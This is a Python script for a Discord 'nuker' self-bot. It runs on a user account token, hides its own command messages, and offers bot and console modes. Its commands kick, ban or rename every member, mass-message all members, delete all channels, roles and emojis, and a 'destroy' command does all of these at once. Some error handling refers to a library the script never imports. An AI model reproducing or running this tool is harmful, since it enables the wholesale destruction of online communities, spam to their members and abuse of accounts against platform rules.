token = ""  # refer to main branch
prefix = "~"
commandlist = ["kall", "ball", "rall", "mall", "dall", "destroy", "users", "channels"]
commanddetails = ["> (kall) - short for kick all, kicks every member in the server.",
                  "> (ball) - short for ban all, bans every member in the server.",
                  "> (rall rename_to) - short for rename all, renames every member in the server to the desired rename_to argument.",
                  "> (mall message) - short for message all, messages every member in a guild with a message of your choice.",
                  "> (dall [channels|roles|emojis|all]) - short for delete all, deletes every condition stated.",
                  "> (destroy) - deletes everything possible, then bans every member in the server as long as you have permission.",
                  "-> (users) - shows users in guild.", "-> (channels) - shows channels in guild."]
import asyncio
import os

try:
    import discord
except:
    os.system("python3 -m pip install -U git+https://github.com/Rapptz/discord.py@v1.x")
    import discord
from discord.ext import commands, tasks

intents = discord.Intents.all()
client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents, self_bot=True)


# Define the self bot ^
async def login():
    await client.run(token, bot=False)


print(
    """
    Bot Mode:
    Login with a single token and responds to commands on discord.
    CLI Mode:
    Command Line Interface, send commands over the console instead of through discord.
    """
)
choose = input("Bot or CLI mode?\n")
if choose.lower().find("bot") != -1:
    @client.event
    async def on_command_error(ctx, error):
        pass


    @client.check
    async def command_invoke_delete(ctx):
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            # lol this should never happen
            pass
        finally:
            return True


    @client.event
    async def on_ready():
        print("Ready to be innocent.")


    @client.command()
    async def kall(ctx):
        for member in ctx.guild.members:

            if member == client.user:
                continue

            try:
                await member.kick()
            except discord.Forbidden:
                print(f"{member.name} has FAILED to be kicked from {ctx.guild.name}")
            else:
                print(f"{member.name} has been kicked from {ctx.guild.name}")

        print("Action Completed: kall")


    @client.command()
    async def ball(ctx):
        for member in ctx.guild.members:

            if member == client.user:
                continue

            try:
                await member.ban()
            except discord.Forbidden:
                print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
            else:
                print(f"{member.name} has been kicked from {ctx.guild.name}")

        print("Action Completed: ball")


    @client.command()
    async def rall(ctx, *, nick):
        for member in ctx.guild.members:

            try:
                await member.edit(nick=nick)
            except discord.Forbidden:
                print(f"{member.name} has NOT been renamed to {nick} in {ctx.guild.name}")
            else:
                print(f"{member.name} has been renamed to {nick} in {ctx.guild.name}")

        print("Action Completed: rall")


    @client.command()
    async def mall(ctx, *, message):
        for member in ctx.guild.members:

            if member == client.user:
                continue

            try:
                await member.send(message)
            except discord.Forbidden:
                print(f"{member.name} has NOT recieved the message.")
            else:
                print(f"{member.name} has recieved the message.")

        print("Action Completed: mall")


    @client.group(invoke_without_command=True, case_insensitive=True)
    async def dall(ctx):
        print(f'Choose an option from -> {", ".join([c.name for c in ctx.command.commands])}')


    @dall.command()
    async def channels(ctx):
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except discord.Forbidden:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            except discord.HTTPException:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            else:
                print(f"{channel.name} has been deleted in {ctx.guild.name}")
        print("Action Completed: dall channels")


    @dall.command()
    async def roles(ctx):

        for role in ctx.guild.roles:

            if str(role) == '@everyone':
                continue

            try:
                await role.delete()
            except discord.Forbidden:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
            else:
                print(f"{role.name} has been deleted in {ctx.guild.name}")

        print("Action Completed: dall roles")


    @dall.command()
    async def emojis(ctx):

        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            except discord.Forbidden:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            else:
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")

        print("Action Completed: dall emojis")


    @dall.command()
    async def all(ctx):
        # LOL
        print('Deleting all...')

        print('Deleting channels..')
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except discord.Forbidden:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            except discord.HTTPException:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            else:
                print(f"{channel.name} has been deleted in {ctx.guild.name}")

        print('Deleting roles..')
        for role in ctx.guild.roles:

            if str(role) == '@everyone':
                continue

            try:
                await role.delete()
            except discord.Forbidden:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
            else:
                print(f"{role.name} has been deleted in {ctx.guild.name}")

        print('Deleting emojis..')
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
            except discord.Forbidden:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            else:
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")

        print("Action Completed: dall all")


    @client.command()
    async def destroy(ctx):

        for member in ctx.guild.members:

            if member == client.user:
                continue

            try:
                await member.ban()
            except discord.Forbidden:
                print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
            else:
                print(f"{member.name} has been banned from {ctx.guild.name}")

        await all(ctx)

        print("Action Completed: destroy")


    try:
        client.run(token, bot=False)
    except discord.LoginFailure:
        print('Invalid Token Passed')
elif choose.lower().find("cli") != -1:
    @tasks.loop(seconds=5)
    async def cmds():
        for guild in client.guilds:
            print(
                f"{guild.name}, {guild.id}, {f'Admin' if guild.me.guild_permissions.administrator is True else f'Not admin.'}")
        server = client.get_guild(int(input("Server ID: ")))
        if server is not None:
            print(
                f'\nNot Admin in {server.name}. Limited options available.\n' if server.me.guild_permissions.administrator is not True else ' ')
            for command in commanddetails:
                print(f"{command}")
            cmd = input("Command: \n")
            if cmd.lower().split()[0] in commandlist:
                if cmd.lower().split()[0] == "kall":
                    for member in server.members:

                        if member == client.user:
                            continue

                        try:
                            await member.kick()
                        except discord.Forbidden:
                            print(f"{member.name} has FAILED to be kicked from {server.name}")
                        else:
                            print(f"{member.name} has been kicked from {server.name}")
                if cmd.lower().split()[0] == "ball":
                    for member in server.members:

                        if member == client.user:
                            continue

                        try:
                            await member.ban()
                        except discord.Forbidden:
                            print(f"{member.name} has FAILED to be banned from {server.name}")
                        else:
                            print(f"{member.name} has been kicked from {server.name}")
                if cmd.lower().split()[0] == "rall":
                    nick = cmd.replace("rall ", "")
                    for member in server.members:
                        try:
                            await member.edit(nick=nick)
                        except discord.Forbidden:
                            print(f"{member.name} has NOT been renamed to {nick} in {server.name}")
                        else:
                            print(f"{member.name} has been renamed to {nick} in {server.name}")
                if cmd.lower().split()[0] == "mall":
                    message = cmd.lower().replace("mall ", "").replace("mall", "") if cmd.lower().replace("mall ",
                                                                                                          "").replace(
                        "mall", "") != "" else input("Message to send: ")
                    for member in server.members:

                        if member == client.user:
                            continue

                        try:
                            await member.send(message)
                        except discord.Forbidden:
                            print(f"{member.name} has NOT recieved the message.")
                        else:
                            print(f"{member.name} has recieved the message.")
                if cmd.lower().split()[0] == "dall":
                    choices = ["channels", "roles", "emojis", "all"]
                    choice = input("Choose: [channels|roles|emojis|all]: ") if cmd.lower().replace("dall ", "").replace(
                        "dall", "") == "" else cmd.lower().split()[-1]
                    if choice not in choices:
                        print("Please choose a valid option.")
                    else:
                        if choice == "channels":
                            for channel in server.channels:
                                try:
                                    await channel.delete()
                                except nextcord.Forbidden:
                                    print(f"{channel.name} has NOT been deleted in {server.name}")
                                except nextcord.HTTPException:
                                    print(f"{channel.name} has NOT been deleted in {server.name}")
                                else:
                                    print(f"{channel.name} has been deleted in {server.name}")
                        elif choice == "roles":
                            for role in server.roles:

                                if str(role) == '@everyone':
                                    continue

                                try:
                                    await role.delete()
                                except nextcord.Forbidden:
                                    print(f"{role.name} has NOT been deleted in {server.name}")
                                else:
                                    print(f"{role.name} has been deleted in {server.name}")
                        elif choice == "emojis":
                            for emoji in server.emojis:
                                try:
                                    await emoji.delete()
                                    print(f"{emoji.name} has been deleted in {server.name}")
                                except nextcord.Forbidden:
                                    print(f"{emoji.name} has NOT been deleted in {server.name}")
                                else:
                                    print(f"{emoji.name} has been deleted in {server.name}")
                        elif choice == "all":
                            print('Deleting all...')

                            print('Deleting channels..')
                            for channel in server.channels:
                                try:
                                    await channel.delete()
                                except nextcord.Forbidden:
                                    print(f"{channel.name} has NOT been deleted in {server.name}")
                                except nextcord.HTTPException:
                                    print(f"{channel.name} has NOT been deleted in {server.name}")
                                else:
                                    print(f"{channel.name} has been deleted in {server.name}")

                            print('Deleting roles..')
                            for role in server.roles:

                                if str(role) == '@everyone':
                                    continue

                                try:
                                    await role.delete()
                                except nextcord.Forbidden:
                                    print(f"{role.name} has NOT been deleted in {server.name}")
                                else:
                                    print(f"{role.name} has been deleted in {server.name}")

                            print('Deleting emojis..')
                            for emoji in server.emojis:
                                try:
                                    await emoji.delete()
                                except nextcord.Forbidden:
                                    print(f"{emoji.name} has NOT been deleted in {server.name}")
                                else:
                                    print(f"{emoji.name} has been deleted in {server.name}")
                if cmd.lower().split()[0] == "destroy":
                    for member in server.members:

                        if member == client.user:
                            continue

                        try:
                            await member.ban()
                        except discord.Forbidden:
                            print(f"{member.name} has FAILED to be banned from {server.name}")
                        else:
                            print(f"{member.name} has been banned from {server.name}")
                    print('Deleting all...')

                    print('Deleting channels..')
                    for channel in server.channels:
                        try:
                            await channel.delete()
                        except discord.Forbidden:
                            print(f"{channel.name} has NOT been deleted in {server.name}")
                        except discord.HTTPException:
                            print(f"{channel.name} has NOT been deleted in {server.name}")
                        else:
                            print(f"{channel.name} has been deleted in {server.name}")

                    print('Deleting roles..')
                    for role in server.roles:

                        if str(role) == '@everyone':
                            continue

                        try:
                            await role.delete()
                        except discord.Forbidden:
                            print(f"{role.name} has NOT been deleted in {server.name}")
                        else:
                            print(f"{role.name} has been deleted in {server.name}")

                    print('Deleting emojis..')
                    for emoji in server.emojis:
                        try:
                            await emoji.delete()
                        except discord.Forbidden:
                            print(f"{emoji.name} has NOT been deleted in {server.name}")
                        else:
                            print(f"{emoji.name} has been deleted in {server.name}")
                if cmd.lower().split()[0] == "users":
                    for user in server.members:
                        print(f"{user.name}, {user.id}, {user.status}. {user.top_role}")
                if cmd.lower().split()[0] == "channels":
                    for channel in server.channels:
                        print(f"{channel.name} is a {channel.type}.")
                print(f"Action Completed: {cmd.lower().split()[0]}")
                await asyncio.sleep(5)

            else:
                print("Invalid command.")
        else:
            print("Invalid Server ID.")


    @client.event
    async def on_ready():
        print(f"Logged in as {client.user}")
        cmds.start()


    try:
        client.run(token, bot=False)
    except discord.LoginFailure:
        print('Invalid Token Passed')
    except discord.HTTPException as e:
        print(e)
else:
    print("Please choose a valid option.")
    os.system("python3 innocent.py")
